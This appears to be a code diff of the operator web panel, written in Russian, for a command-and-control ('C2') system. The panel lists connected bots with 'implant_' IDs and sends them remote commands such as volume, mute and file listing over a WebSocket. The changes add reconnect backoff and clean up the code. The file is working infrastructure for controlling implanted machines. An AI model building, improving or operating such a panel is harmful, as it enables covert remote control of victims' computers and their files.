@@ -1,11 +1,11 @@
-<!DOCTYPE html&gt;
-<!-- Файл: index.html (Версия 6.6 - Финальная, совместимая версия) -->
+<!DOCTYPE html>
+<!-- Файл: index.html (Финальная, ревизированная версия) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик v6.6</title>
+    <title>C2 Коммандный Мостик (ФИНАЛ)</title>
     <style>
         :root {
             --bg-color: #1a1a1c;
@@ -304,8 +304,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик v6.6</h1></header>
-
+            <h1>Коммандный Мостик (ФИНАЛ)</h1></header>
         <main class="app-layout">
             <aside class="sidebar">
                 <h2>Боты в сети</h2>
@@ -334,9 +333,7 @@
                             <div>
                                 <h3>Управление звуком</h3>
                                 <div class="volume-control-wrapper">
-                                    <input type="range" id="volume-slider" min="0" max="100">
-                                    <span id="volume-value">50%</span>
-                                </div>
+                                    <input type="range" id="volume-slider" min="0" max="100"><span id="volume-value">50%</span></div>
                                 <button class="btn-action" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
                             </div>
                             <div>
@@ -352,7 +349,6 @@
                 </div>
             </div>
         </main>
-
         <div id="resizer"></div>
         <div class="log-container">
             <div class="log-header" id="log-header">
@@ -386,6 +382,8 @@
         let socket, selectedBotId = null,
             pingInterval = null,
             watchdogTimer = null;
+        let reconnectDelay = 3000;
+        const maxReconnectDelay = 60000;
 
         function log(message, type = 'info') {
             const now = new Date();
@@ -402,9 +400,12 @@
             if (pingInterval) clearInterval(pingInterval);
             if (watchdogTimer) clearTimeout(watchdogTimer);
             if (socket && socket.readyState !== WebSocket.CLOSED) socket.close();
+
             socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+
             socket.onopen = () => {
                 log("Соединение установлено.", "success");
+                reconnectDelay = 3000;
                 socket.send(JSON.stringify({
                     type: 'operator'
                 }));
@@ -418,6 +419,7 @@
                     }
                 }, 25000);
             };
+
             socket.onmessage = (event) => {
                 if (event.data === 'pong') {
                     if (watchdogTimer) clearTimeout(watchdogTimer);
@@ -432,51 +434,49 @@
                         case 'bot_details':
                             if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
                             break;
-                        case 'status':
-                            log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
-                            break;
                         case 'volume_update':
                             if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
                             break;
                         case 'file_list_update':
                             if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
                             break;
+                        case 'status':
+                            log(`[${msg.bot_id || 'SERVER'}] ${msg.data}`);
+                            break;
                     }
                 } catch (e) {
                     log(`Ошибка обработки сообщения: ${e}`, 'error');
                 }
             };
+
             socket.onclose = () => {
-                log("Соединение потеряно. Переподключение через 3с...", "error");
+                log(`Соединение потеряно. Переподключение через ${reconnectDelay / 1000}с...`, "error");
                 if (pingInterval) clearInterval(pingInterval);
                 if (watchdogTimer) clearTimeout(watchdogTimer);
                 selectBot(null);
-                setTimeout(connect, 3000);
+                setTimeout(connect, reconnectDelay);
+                reconnectDelay = Math.min(reconnectDelay * 2, maxReconnectDelay);
             };
         }
 
-        // <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ >>>
         function updateBotList(bots) {
-            // Правильно обрабатываем список ОБЪЕКТОВ
             log(`Получен список ботов: [${bots.map(b => b.id).join(', ') || 'пусто'}]`);
             const savedBotId = localStorage.getItem('lastSelectedBot');
             const currentSelected = selectedBotId;
             ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-
-            bots.forEach(bot => { // bot - это {id: '...'}
+            bots.forEach(bot => {
                 const btn = document.createElement('button');
-                btn.textContent = bot.id.replace('implant_', ''); // Используем bot.id
+                btn.textContent = bot.id.replace('implant_', '');
                 btn.className = 'btn-bot';
-                btn.onclick = () => selectBot(bot.id); // Передаем bot.id
+                btn.onclick = () => selectBot(bot.id);
                 ui.botList.appendChild(btn);
             });
-
             if (currentSelected && bots.some(b => b.id === currentSelected)) {
                 selectBot(currentSelected, false);
             } else if (savedBotId && bots.some(b => b.id === savedBotId)) {
                 selectBot(savedBotId, true);
             } else {
-                selectBot(bots.length > 0 ? bots[0].id : null, true); // Используем bots[0].id
+                selectBot(bots.length > 0 ? bots[0].id : null, true);
             }
         }
 
@@ -559,6 +559,7 @@
             }));
             log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
         }
+
         const debounce = (func, delay) => {
             let timeout;
             return (...args) => {
@@ -612,9 +613,8 @@
         document.addEventListener('DOMContentLoaded', () => {
             const savedHeight = localStorage.getItem('logHeight');
             if (savedHeight) ui.logContainer.style.height = savedHeight;
+            connect();
         });
-
-        connect();
     </script>
 </body>
 
